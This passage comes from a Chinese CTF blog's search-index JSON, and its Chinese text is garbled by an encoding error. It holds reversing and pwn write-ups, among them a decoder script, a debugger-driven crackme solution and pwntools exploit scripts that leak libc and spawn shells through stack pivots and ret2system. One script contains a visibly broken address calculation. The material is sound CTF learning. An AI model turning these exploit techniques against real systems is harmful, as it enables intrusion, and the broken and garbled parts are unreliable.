é‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼šé‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼å¯ä»¥æŒ‡å®šFTPæ–‡ä»¶å¤¹ã€‚ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"å®‰æ’æŠ—ç–«èµ›","slug":"å®‰æ’æŠ—ç–«èµ›","date":"2020-02-29T04:12:59.000Z","updated":"2020-03-12T15:11:14.000Z","comments":true,"path":"2020/02/29/å®‰æ’æŠ—ç–«èµ›/","link":"","permalink":"http://chumen77.xyz/2020/02/29/å®‰æ’æŠ—ç–«èµ›/","excerpt":"","text":"å®‰æ’æŠ—ç–«èµ›å¾ˆç®€å•çš„æ¯”èµ›ï¼Œé¢˜ä¹Ÿä¸å¤šï¼Œè®°å½•ä¸€ä¸‹åšçš„2é“ç®€å•çš„Reã€‚ re1_pycæ‹¿åˆ°çš„æ˜¯ä¸€ä¸ªpycæ–‡ä»¶ã€‚ç›´æ¥æ‹¿åˆ°ç½‘ç«™ä¸Šåç¼–è¯‘ä¸€ä¸‹ï¼š #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = '' for i in flag: enc1 += chr(ord(i) - 5) return enc1 def rail(flag): p1 = '' p2 = '' p3 = '' enc2 = '' for i in range(len(flag)): j = i % 3 if j == 0: p1 += flag[i] continue if j == 1: p2 += flag[i] continue p3 += flag[i] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' table2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' table = string.maketrans(table1, table2) return flag.translate(table, '=') while True: flag = raw_input('please input flag to check:') if rep(base64.b64encode(rail(caser(flag)))) == 'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi': print 'Success!you got it!' break continue print 'try a gain' é€»è¾‘æŒºç®€å•çš„ï¼Œç›´æ¥æ‹¿ç€è¿™ä¸ªä»£ç æ”¹ä¸‹ï¼š #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = '' for i in flag: enc1 += chr(ord(i) + 5) return enc1 def rail(flag): p1 = '' p2 = '' p3 = '' enc2 = '' j = 0 x = 25 for i in range(x): j = i + 13 z = j + 13 p3 += flag[i] + flag[j] if z &gt;= 38 : break p3 += flag[z] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' table2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' table = string.maketrans(table1, table2) return flag.translate(table, '=') key = 'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi' flag = rail(caser(base64.b64decode(rep(key) + '='))) print(flag) maze1ä¸€ä¸ªç®€å•çš„mazeé—®é¢˜ï¼Œä¸è¿‡æ˜¯c++å†™çš„ï¼Œidaåç¼–è¯‘çœ‹èµ·æ¥æœ‰ç‚¹éš¾è¯»ã€‚ idaåˆ†æä»è¿™é‡Œç¡®å®šä¸‹åœ°å›¾ï¼Œåé¢çš„2å°±æ˜¯ç»ˆç‚¹ã€‚å»å†…å­˜ä¸­å–å‡ºæ¥åœ°å›¾ï¼šå»idaç»§ç»­åˆ†æï¼šå‘ç°ä½ è¾“å…¥çš„å­—ç¬¦ä¸²éœ€è¦ç­‰äº10ï¼Œå¦‚æœä¸æ˜¯ç›´æ¥å°±å¤±è´¥ï¼Œé•¿åº¦ç­‰äº10æ‰ç»§ç»­åˆ¤æ–­ã€‚awsdè¿˜æ˜¯è¿™å‡ ä¸ªå­—ç¬¦æ§åˆ¶æ–¹å‘ã€‚å†è”ç³»ä¸€ä¸‹å‰é¢çš„åœ°å›¾ï¼Œç»ˆç‚¹æ˜¯2ï¼Œåªèƒ½èµ°10æ­¥ï¼ŒçŒœä¸€æ³¢dddddsssssã€‚å°±æ˜¯è¿™ä¸ªï¼Œflagå°±æ˜¯å»md5åŠ å¯†ä¸€ä¸‹å‡ºæ¥çš„å­—ç¬¦ä¸²ã€‚","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜","slug":"è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜","date":"2020-02-25T08:55:25.000Z","updated":"2020-08-17T08:23:18.427Z","comments":true,"path":"2020/02/25/è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜/","link":"","permalink":"http://chumen77.xyz/2020/02/25/è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜/","excerpt":"","text":"è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜åƒé¸¡ç¥å™¨è¿™ä¸ªé¢˜ç›®æ˜¯æ¯”èµ›æ—¶æ²¡åšï¼Œå› ä¸ºæœ‰ä¸€æ®µæ—¶é—´æ²¡åšreé¢˜ç›®äº†ï¼Œä¸‹æ¥çœ‹åˆ°è¿™ä¸ªé¢˜åšå‡ºçš„äººä¸ç®—å°‘ï¼Œå°±å»å°è¯•åšä¸€åšã€‚æºç¨‹åºæ˜¯qtå†™çš„ï¼Œä»¥å‰å¬å®¤å‹è¯´è¿‡qtçš„ç¨‹åºidaæ˜¯é™æ€åˆ†æä¸äº†çš„ï¼Œå‡½æ•°è°ƒç”¨å¤ªå¤šäº†ï¼Œå°±ç›´æ¥åŠ¨æ€åˆ†æã€‚è¿™ä¸ªé¢˜ç›®åº”è¯¥æ˜¯æœ‰å¤šçº¿ç¨‹odæ‰“å¼€ç›´æ¥æ˜¯é»‘å±çš„ï¼Œå·¦ä¸‹è§’æ˜¾ç¤ºæ–°å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ä¹Ÿæ¯”è¾ƒæ²¡æœ‰å¤´ç»ªã€‚æŠ˜è…¾äº†ä¸€ä¼šå‘ç°ç”¨çš„x64dbgå¯ä»¥è°ƒè¯•äº†ã€‚ x64dbgè°ƒè¯•ä¸€ç›´è¿è¡Œç¨‹åºç­‰ä»£ç è·‘åˆ°0x40å¼€å¤´çš„æ®µï¼Œè¿›å…¥login çš„æ¨¡å—ã€‚æ‰¾ä¸‹å­—ç¬¦ä¸²ï¼šï¿¼åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ã€‚å› ä¸ºç™»é™†å¤±è´¥ä¼šè·³è½¬è¾“å‡ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æŸ¥çœ‹å‡ºæ˜¯ä»å“ªé‡Œè·³è½¬è¿‡æ¥çš„ç„¶ååœ¨å¯†ç åˆ¤æ–­é‚£é‡Œæ¥ç»§ç»­åˆ†æã€‚çœ‹åˆ°å·²ç»è·³è½¬è¿‡æ¥äº†ï¼Œä½†æ˜¯å‘ç°é™„è¿‘æ²¡æœ‰ä»€ä¹ˆåˆ¤æ–­çš„åœ°æ–¹ï¼Œå»æ ¹æ®é‚£ä¸ªä»å“ªé‡Œè·³è½¬è¿‡æ¥ï¼Œè¿½è¿‡å»çœ‹åˆ°ç™»é™†æˆåŠŸè°ƒç”¨welcomeçš„å‡½æ•°ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„é‚£é‡Œçš„åˆ¤æ–­ä¸æ˜¯è¦æ‰¾çš„å¯†ç åˆ¤æ–­ã€‚æ¢ä¸ªæ€è·¯ï¼Œè¿˜æ˜¯è·³è½¬åˆ°å¤±è´¥é‚£é‡Œï¼Œä½†æ˜¯åœ¨ä¸Šå±‚å‡½æ•°çš„æ ˆä¸­ï¼Œå› ä¸ºå­˜åœ¨åˆ¤æ–­ç™»é™†çš„ç”¨æˆ·è·Ÿå¯†ç ï¼Œåº”è¯¥ä¼šå­˜åœ¨æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œå¯»æ‰¾ä¸€ä¸‹å¯†ç è·Ÿç”¨æˆ·åã€‚æ‰¾åˆ°äº†ï¼Œç»™ç”¨æˆ·åå¯¹åº”çš„åœ°å€ä¸‹ä¸€ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œæ¥çœ‹çœ‹å“ªé‡Œä¼šè®¿é—®è¿™é‡Œï¼Œåªè¦è®¿é—®äº†åŸºæœ¬è·ç¦»è¦æ‰¾çš„å‡½æ•°å·®ä¸è¿œäº†ã€‚å…¶ä¸­ç¬¬äºŒä¸ªå­—ç¬¦å¯¹åº”å¤„ï¼Œç»æµ‹è¯•ä¸åº”è¯¥ä¸‹æ–­ç‚¹ã€‚ä¸€ç›´è®©å…¶F9è¿è¡Œï¼Œç­‰åˆ°äº†ç”¨æˆ·0x40æ®µä»£ç ï¼šå‘ç°è¿™æ®µæ˜¯åœ¨ä¸€ä¸ªä¸ªå­—ç¬¦å¤„ç†lubenweiå­—ç¬¦ä¸²ï¼Œè¿˜æœ‰retï¼Œè¿™æ ·åŸºæœ¬å°±æ˜¯äº†ã€‚retä»¥ååˆ°ï¼šæ³¨æ„æ­¤å¤„çš„æ±‡ç¼–è¯­å¥ï¼Œå¹¶çœ‹ä¸‹å¯„å­˜å™¨æƒ…å†µï¼š åˆšåˆšèµ°è¿‡callå‡½æ•°ï¼Œä¸‹é¢ä¸”æœ‰cmpå¯¹æ¯”è¯­å¥ï¼Œå¹¶ä¸”å‘ç°äº†è¾“å…¥çš„å¯†ç 12345678ï¼Œååˆ†å¯ç–‘äº†ã€‚åœ¨è¿™å‡ å¤„å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œé‡æ–°ç‚¹å‡»loginéªŒè¯è¿›è¡Œåˆ†æï¼Œå‘ç°çš„ç¡®æ–­åœ¨äº†ä¸‹çš„è¿™å‡ ä¸ªå‡½æ•°ï¼Œç»“åˆå¯„å­˜å™¨æŸ¥çœ‹å‘ç°ï¼Œè¾“å…¥çš„å¯†ç è·Ÿèµ°è¿‡0x004021D3è¿™ä¸ªå‡½æ•°åä¼ è¿‡æ¥çš„eaxè¿›è¡Œå¯¹æ¯”ã€‚å¹¶ä¸”ä¸€å¯¹æ¯”ä»¥åå°±è¿›å…¥äº†ï¼Œæç¤ºç™»é™†å¤±è´¥çš„åœ°æ–¹ã€‚æ‰€ä»¥è¿™ä¸ªeaxå°±æ˜¯ç”¨æˆ·çš„å¯†ç äº†ã€‚æµ‹è¯•ä»¥åå‘ç°æ˜¯å°å†™çš„eax 41D26F00 ï¼š41d26f00,è¾“å…¥å¯†ç ï¼šOk,æˆåŠŸäº†ã€‚ borrowstackè¿™ä¸ªé¢˜ç›®åå­—å°±æ˜¯borrowshack æ¥æ ˆã€‚å«ä¹‰å°±æ˜¯è½¬ç§»æ ˆï¼Œæ­£å¥½æœ€è¿‘åˆšå­¦è¿‡ï¼Œå°±åŠ¨æ‰‹å»åšäº†ï¼Œç»“æœå¡äº†å¾ˆä¹…ï¼Œä½†ä¹Ÿå­¦åˆ°å¾ˆå¤šï¼Œæ­¤å‰ç»ƒä¹ çš„æ ˆè¿ç§»é¢˜ç›®æ²¡æœ‰è¿™é¢˜çš„æƒ…å†µã€‚ æŸ¥ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/xcgys/borrowstack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; char buf; // [rsp+0h] [rbp-60h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(&amp;s); read(0, &amp;buf, 0x70uLL); puts(\"Done!You can check and use your borrow stack now!\"); read(0, &amp;bank, 0x100uLL); return 0; &#125; ä»£ç æ˜¯å¾ˆç®€å•çš„ï¼Œbankçš„åœ°å€åœ¨bssæ®µï¼Œä»¥åç•™ç€åšæ ˆè¿ç§»å°±å¯ä»¥äº† ã€‚æº¢å‡ºåœ°å€è¿˜æ˜¯åªå¯ä»¥æ§åˆ¶ebpï¼Œè·Ÿretadressã€‚æ¥ä¸‹æ¥å°±æ˜¯è‡ªå·±å­¦åˆ°çš„äº†ï¼Œè‡ªå·±æ‰‹åŠ¨è°ƒè¯•äº†ä¸€æ®µæ—¶é—´æ‰å‘ç°çš„ã€‚ å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰å…ˆè¯´ä¸‹è¿™ä¸ªç¨‹åºçš„æƒ…å†µï¼šbank çš„åœ°å€ .bss:0000000000601080æ³¨æ„çœ‹ä¸‹bssæ®µé‡Œgotæ®µçš„è·ç¦»ï¼Œä¸€å…±æ˜¯40ä¸ªå­—èŠ‚ï¼Œæ˜¯æ¯”è¾ƒè¿‘çš„ã€‚å¦‚æœæŒ‰æˆ‘ä»¥å‰çš„åšæ³•ç›´æ¥è¿ç§»åˆ°bankè¿™åœ°å€åšæ–°æ ˆï¼Œå½“æ ˆè¿ç§»è¿‡å»ä»¥åï¼Œä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²æŸä¸ªå‡½æ•°gotå¯¹åº”çš„åœ°å€æ—¶ï¼Œä¼šå‘ç°å½“è°ƒç”¨putsä»¥åï¼Œä¼šè¿›å…¥libcä¸­å¼€å§‹ä¸€è¿ä¸²çš„å‡½æ•°è°ƒç”¨ï¼šç¬¬ä¸€ä¸ªå‘ç°è¿˜æ²¡æœ‰pushï¼Œæ­¤æ—¶rspå°±æ˜¯bankçš„åœ°å€äº†ï¼Œpushè¿‡åè‚¯å®šæ ˆæŒ‡é’ˆå¼€å§‹æ…¢æ…¢å˜å°ï¼Œå¾€bssæ®µä¸Šæ–¹å»¶ä¼¸ã€‚å½“è°ƒç”¨ç¬¬äºŒä¸ªå‡½æ•°ï¼šå‘ç°å·²ç»åˆ°äº†bssä¸Šæ–¹çš„gotè¡¨æ®µï¼Œè¿™æ ·æ¯«æ— ç–‘é—®ï¼Œé‡Œé¢çš„å€¼å°±ä¼šæ”¹åŠ¨äº†ï¼Œç¨‹åºæ¥ä¸‹æ¥å‘ç”Ÿä»€ä¹ˆæ˜¯å¾ˆéš¾é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¸ªäººä¹Ÿæ‹¿ä¸åˆ°åŸæœ¬çš„gotåœ°å€ï¼Œä»è€Œç®—å‡ºlibcåŸºåœ°å€ã€‚å¹¶ä¸”ä¼šå‘ç°ï¼Œå½“ä»¥å¾€å›åˆ°startå¤„æ¸…ç†æ ˆæƒ³å†æ¬¡åˆ©ç”¨æ¼æ´çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¸è¡Œäº†ï¼Œä¹Ÿæ˜¯å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆæ•°æ®è¢«æ”¹åŠ¨ï¼Œé€ æˆäº†å½±å“ã€‚ è§£å†³åŠæ³•å°±æ˜¯æŠŠæ ˆè¿ç§»åˆ°bssæ®µçš„å°½é‡é åï¼Œè¿™æ ·å°±ä¼šå°½é‡ä¸å½±å“åˆ°gotè¡¨å’ŒåŸæœ¬æ­£å¸¸çš„æ•°æ®ã€‚è¿”å›åœ°å€ä¸å†æ˜¯è‡ªå·±å¸¸å¸¸ç”¨çš„startå¤„ï¼Œæ¢æˆå…¶ä»–åˆé€‚çš„åœ°æ–¹ã€‚ expfrom pwn import * from LibcSearcher import * import time context.log_level = 'debug' context.arch = 'amd64' io = process('./borrowstack') # io = remote('123.56.85.29',3635) elf = ELF('./borrowstack') # libc = elf.libc leave_addr = 0x0400699 offset = 200 buf_addr = 0x000601080 padding = 0x60 start_addr = 0x0400626 p = '\\x00'* padding + p64(buf_addr+offset) + p64(leave_addr) pop_rsi_rx_ret = 0x400701 io.recvuntil('want\\n') raw_input('-&gt;') io.send(p) io.recvuntil('stack now!\\n') libc_start_main = elf.got['__libc_start_main'] puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x400703 read_got = elf.got['read'] p = flat(['b'*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr]) raw_input('-&gt;') io.sendline(p) puts_add = u64((io.recv(6)).ljust(8,'\\x00')) print(hex(puts_add)) obj = LibcSearcher('puts',puts_add) libc_base = puts_add - obj.dump('puts') print(hex(libc_base)) sleep(0.1) rec = libc_base + 0x4526a system_addr = libc_base + libc_base binsh_addr = libc_base + libc_base print(hex(system_addr)) print(hex(binsh_addr)) io.recvline() io.recvuntil('want\\n') p = '\\x00'* padding + p64(1) + p64(rec) io.send(p) io.interactive() ç»“è®ºå’Œæ”¶è·ç»“è®ºï¼šå½“æ ˆè¿ç§»åˆ°bssæ®µä»¥åï¼Œç”±äºlibcå‡½æ•°çš„è°ƒç”¨ï¼Œæ­¤æ—¶æ ˆæ…¢æ…¢å¢é«˜ï¼Œbssæ®µä»¥ä¸Šçš„æ•°æ®ä¹Ÿå¯èƒ½ä¼šè¢«æ”¹åŠ¨ã€‚æ”¶è·ï¼šå½“å†é‡åˆ°æ ˆè¿ç§»é—®é¢˜çš„æ—¶å€™ï¼Œè¦æ³¨æ„bssæ®µä¸gotçš„è·ç¦»ï¼Œè¿”å›åœ°å€å†™å…¥startåœ°å€ï¼Œå‘ç°å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå°±è¯¥æå‡æ ˆè¿ç§»çš„åœ°å€é«˜åº¦ï¼Œå’Œæ‰¾ä¸ªåˆé€‚çš„è¿”å›ä½ç½®ï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´ã€‚","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"XCTF\\_pwnæ–°æ‰‹","slug":"XCTF_pwnæ–°æ‰‹","date":"2020-02-17T12:42:23.000Z","updated":"2020-02-28T09:12:25.000Z","comments":true,"path":"2020/02/17/XCTF_pwnæ–°æ‰‹/","link":"","permalink":"http://chumen77.xyz/2020/02/17/XCTF_pwnæ–°æ‰‹/","excerpt":"","text":"XCTF_pwnæ–°æ‰‹cgpwn2æŸ¥ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†ææ¼æ´å°±åœ¨è¿™så¤„ï¼Œgetså¯ä»¥æ— é™è¯»å–ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚ æ”»å‡»æ€è·¯ ç¬¬ä¸€ä¸ªfgetsè·å–æ—¶å€™ï¼Œè¯»å–ä¸€ä¸ª/bin/sh\\x00è¿›å»ï¼Œå› ä¸ºnameçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚ getå‡½æ•°è·å–æ—¶å€™ï¼Œpadding + system_plt +nameåœ°å€å³å¯ã€‚ expfrom pwn import * context.log_level = 'debug' # io = process('./cgpwn2') io = remote('111.198.29.45',40540) elf = ELF('./cgpwn2') io.recvuntil('name\\n') raw_input('-&gt;') io.sendline('/bin/sh\\x00') system_plt = elf.symbols['system'] padding = 0x26 + 4 binsh_add = 0x0804A080 payload = padding * 'a' + p32(system_plt) + p32(0x0804A080) + p32(binsh_add) raw_input('-&gt;') io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯","slug":"åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯","date":"2020-02-15T08:54:53.000Z","updated":"2020-02-28T07:49:41.000Z","comments":true,"path":"2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/","link":"","permalink":"http://chumen77.xyz/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/","excerpt":"","text":"åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯å‰è¨€è®°å½•ä¸€ä¸‹å¦ä¸€ç§æ²¡æœ‰libcï¼Œå®Œæˆæ¼æ´åˆ©ç”¨çš„åŠæ³•ï¼Œå­¦å®Œåè‡ªæˆ‘æ„Ÿè§‰è¿™ä¸ªåŠæ³•å·²ç»æ¯”è¾ƒè½åäº†ï¼Œæ²¡æœ‰libcseacherå¥½ç”¨ï¼Œä¹Ÿç”¨èµ·æ¥æ¯”å®ƒéš¾çš„å¤šäº†ã€‚é’ˆå¯¹äºlibcseacherä¸èƒ½åšçš„é¢˜ï¼Œç”¨è¿™ç§åŠæ³•ï¼Œå¦åˆ™è¿˜æ˜¯libcseacherå¥½ç”¨ã€‚ Dynelfè§£æåŠ è½½çš„ã€åŠ¨æ€é“¾æ¥çš„ELFâ¼†è¿›åˆ¶â½‚ä»¶ä¸­çš„ç¬¦å·ã€‚ç»™å®šâ¼€ä¸ªå¯ä»¥åœ¨ä»»æ„åœ°å€æ³„æ¼æ•°æ®çš„å‡½æ•°ï¼Œä»»ä½•åŠ è½½çš„ åº“ä¸­çš„ä»»ä½•ç¬¦å·éƒ½å¯ä»¥è¢«è§£æã€‚ï¼ˆå®˜æ–¹æ–‡æ¡£è§£é‡Šï¼‰ åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼šio = remote(ip, port) def leak(addr): payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot; io.send(payload) data = io.recv() #debugç”¨çš„ print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data #åˆå§‹åŒ–DynELFæ¨¡å— d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject) system_addr = d.lookup(â€œsystemâ€, &apos;libc&apos;)å…¶ä¸­ç¬¬2ä¸ªå‚æ•°ï¼Œå¯ä»¥ä¸ä¼ ã€‚è¿›è¡Œçš„å·¥ä½œä¸»è¦é›†ä¸­åœ¨leakå‡½æ•°çš„å…·ä½“å®ç°ä¸Šï¼Œä¸Šé¢çš„ä»£ç åªæ˜¯ä¸ªæ¨¡æ¿ã€‚å…¶ä¸­ï¼Œaddrå°±æ˜¯leakå‡½æ•°è¦æ³„æ¼ä¿¡æ¯çš„æ‰€åœ¨åœ°å€ã€‚æ­£æ˜¯è¿™ä¸ªaddrçš„å‚æ•°çš„å­˜åœ¨ï¼Œæ‰è®©Dynelfå‡½æ•°åœ¨å†…å­˜ä¸­åˆ°å¤„çš„leakä»¥åŠå¯¹æ¯”æ˜¯å¦æ˜¯æˆ‘ä»¬å¯»æ‰¾çš„sympolsã€‚ ä¸”ç”±äºDynELFä¼šå¤šæ¬¡è°ƒç”¨leakå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»èƒ½ä»»æ„æ¬¡ä½¿ç”¨ï¼Œå³ä¸èƒ½æ³„éœ²å‡  ä¸ªåœ°å€ä¹‹åå°±å¯¼è‡´ç¨‹åºå´©æºƒã€‚ç”±äºéœ€è¦æ³„éœ²æ•°æ®ï¼Œpayloadä¸­å¿…ç„¶åŒ…å«ç€æ‰“å°å‡½æ•°ï¼Œå¦‚write, puts, printfç­‰ã€‚ ä½¿ç”¨æ¡ä»¶ï¼šä¸ç®¡æœ‰æ²¡æœ‰libcæ–‡ä»¶ï¼Œè¦æƒ³è·å¾—ç›®æ ‡ç³»ç»Ÿçš„systemå‡½æ•°åœ°å€ï¼Œé¦–å…ˆéƒ½è¦æ±‚ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªèƒ½å¤Ÿæ³„æ¼ç›®æ ‡ç³»ç»Ÿå†…å­˜ä¸­libcç©ºé—´å†…ä¿¡æ¯çš„æ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºæˆ‘ä»¬æ˜¯åœ¨å¯¹æ–¹å†…å­˜ä¸­ä¸æ–­æœç´¢åœ°å€ä¿¡æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦è¿™æ ·çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿè¢«åå¤è°ƒç”¨ã€‚ä»¥ä¸‹æ˜¯å¤§è‡´å½’çº³çš„ä¸»è¦ä½¿ç”¨æ¡ä»¶ï¼š ç›®æ ‡ç¨‹åºå­˜åœ¨å¯ä»¥æ³„éœ²libcç©ºé—´ä¿¡æ¯çš„æ¼æ´ï¼Œå¦‚read@gotå°±æŒ‡å‘libcåœ°å€ç©ºé—´å†…ï¼› ç›®æ ‡ç¨‹åºä¸­å­˜åœ¨çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿåå¤è§¦å‘ï¼Œä»è€Œå¯ä»¥ä¸æ–­æ³„éœ²libcåœ°å€ç©ºé—´å†…çš„ä¿¡æ¯ã€‚ ä»¥ä¸Šä»…ä»…æ˜¯å®ç°åˆ©ç”¨çš„åŸºæœ¬æ¡ä»¶ï¼Œä¸åŒçš„ç›®æ ‡ç¨‹åºå’Œè¿è¡Œç¯å¢ƒéƒ½ä¼šæœ‰ä¸€äº›å‘éœ€è¦ç»•è¿‡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦é’ˆå¯¹writeå’Œputsè¿™ä¸¤ä¸ªæ™®éç”¨æ¥æ³„æ¼ä¿¡æ¯çš„å‡½æ•°åœ¨å®é™…é…åˆDynELFå·¥ä½œæ—¶å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼Œç»™å‡ºç›¸åº”çš„è§£å†³æ–¹æ³•ã€‚ ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²writeå‡½æ•°åŸå‹æ˜¯write(fd, addr, len)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€ï¼Œè¯»å–lenå­—èŠ‚çš„æ•°æ®åˆ°æ–‡ä»¶æµfdï¼ˆ0è¡¨ç¤ºæ ‡å‡†è¾“å…¥æµstdinã€1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºæµstdoutï¼‰ã€‚ å…¶è¾“å‡ºå®Œå…¨ç”±å…¶å‚æ•°lenå†³å®šï¼Œåªè¦ç›®æ ‡åœ°å€å¯è¯»ï¼Œsizeå¡«å¤šå°‘å°±è¾“å‡ºå¤šå°‘ï¼Œä¸ä¼šå—åˆ°è¯¸å¦‚â€˜\\0â€™, â€˜\\nâ€™ä¹‹ç±»çš„å­—ç¬¦å½±å“ã€‚å› æ­¤leakå‡½æ•°ä¸­å¯¹æ•°æ®çš„è¯»å–å’Œå¤„ç†è¾ƒä¸ºç®€å•ã€‚ä½†æ˜¯å…¶ä¸€ä¸ªä¸å¥½çš„åœ°æ–¹ï¼Œå°±æ˜¯éœ€è¦ä¼ é€’3ä¸ªå‚æ•°ï¼Œåœ¨é¢å¯¹64ä½ç¨‹åºçš„æ—¶å€™ï¼Œå…¶ä¸­rdxè¿™ä¸ªå¯„å­˜å™¨æ˜¯æ¯”è¾ƒéš¾å¤„ç†çš„ã€‚å°±ä¸å¾—ä¸ç”¨ä¸‡èƒ½gadgetäº†ã€‚ ä¸‡èƒ½gadgetè¿™ä¸ªæ˜¯libc_initå‡½æ•°çš„æ±‡ç¼–ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€å®šè¦è°ƒç”¨çš„ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶rdi,rsi,rdx,æ‰€ä»¥èƒ½ç§°çš„ä¸Šä¸‡èƒ½gadgetã€‚å¯¹äºä½¿ç”¨è¿™æ®µgadgetï¼Œé¦–å…ˆåœ¨åˆè¯†å‡½æ•°çš„retå¤„å¡«å…¥å¦‚å›¾æ‰€æŒ‡çš„pop rbxçš„åœ°å€ï¼Œç„¶åçœ‹ä¸‹æ ˆå¦‚ä½•æ¥å¸ƒç½®ï¼šï¼ˆå…¶ä¸­ä¸ºä»€ä¹ˆå¡«å…¥gotåœ°å€ï¼Œæ˜¯å› ä¸ºæ¥ä¸‹æ¥retåˆ°mov rdx,r13åé¢çš„call qword ptr[r12+rbx*8] å…¶æ˜¯callè¿™ä¸ªåœ°å€çš„ã€‚ï¼‰åœ¨ç¬¬ä¸€æ®µpop åretåœ°å€è¦å¡«å…¥mov rdx,r13çš„åœ°å€ï¼Œç„¶åå†æ…¢æ…¢æ‰§è¡Œï¼Œå½“æ‰§è¡Œå®Œæˆcallä»¥åï¼Œæµç¨‹è¿˜ä¼šå›åˆ°è¿™ä¸€æ®µæ‰€ä»¥æˆ‘ä»¬ä¸ºäº†å†æ¬¡åˆ©ç”¨æœ€åé‚£ä¸ªretnï¼Œretåˆ°è‡ªå·±æƒ³å»çš„åœ°æ–¹ï¼Œè¦åœ¨æ ˆä¸Šæ‘†å¥½7*8=56ä¸ªå­—èŠ‚ã€‚æ¥ä¸‹æ¥ç»ƒä¹ å…³äºwriteä¸¤ä¸ªé¢˜ç›®ã€‚ PlaidCTF 2013 